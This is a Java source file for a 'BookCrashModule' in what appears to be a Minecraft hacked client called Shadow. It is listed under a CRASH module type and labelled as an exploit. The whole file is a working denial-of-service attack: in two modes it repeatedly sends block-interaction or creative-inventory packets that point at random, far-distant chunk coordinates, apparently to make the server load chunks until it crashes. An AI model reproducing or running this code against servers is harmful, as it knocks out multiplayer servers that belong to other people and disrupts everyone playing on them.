package net.shadow.feature.module;

import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtInt;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;
import net.minecraft.world.World;
import net.shadow.Shadow;
import net.shadow.feature.base.Module;
import net.shadow.feature.base.ModuleType;
import net.shadow.feature.configuration.MultiValue;
import net.shadow.feature.configuration.SliderValue;

import java.util.Random;

public class BookCrashModule extends Module {
    static World w;
    final SliderValue zChunks = this.config.create("Power", 10, 1, 100, 1);
    final MultiValue mode = this.config.create("Mode", "Placement", "Placement", "Creative");
    private int xChunk;
    private int zChunkOffset;

    public BookCrashModule() {
        super("ChunkLoad", "ecploit", ModuleType.CRASH);
    }

    @Override
    public String getVanityName() {
        return this.getName() + "Crash";
    }

    @Override
    public void onEnable() {
        w = Shadow.c.player.clientWorld;
        Random random = new Random();
        xChunk = random.nextInt(100000) - 100000;
        zChunkOffset = random.nextInt(100000) - 50000;
    }

    @Override
    public void onDisable() {
    }

    @Override
    public void onUpdate() {
        if (w != Shadow.c.player.clientWorld) {
            this.setEnabled(false);
            return;
        }
        xChunk += 10;
        for (int z = zChunkOffset; z < zChunks.getThis() + zChunkOffset; z++) {
            if (mode.getThis().equalsIgnoreCase("placement")) {
                PlayerInteractBlockC2SPacket packet = new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(Vec3d.ZERO, Direction.UP, new BlockPos(xChunk << 4, 0, z * 10 << 4), false));
                Shadow.c.getNetworkHandler().sendPacket(packet);
            } else {
                ItemStack load = new ItemStack(Items.CHEST, 1);
                NbtCompound comp = new NbtCompound();
                NbtCompound betag = new NbtCompound();
                betag.put("x", NbtInt.of(xChunk << 4));
                betag.put("y", NbtInt.of(0));
                betag.put("z", NbtInt.of(z * 10 << 4));
                comp.put("BlockEntityTag", betag);
                load.setNbt(comp);
                Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(5, load));
            }
        }
    }

    @Override
    public void onRender() {

    }
}

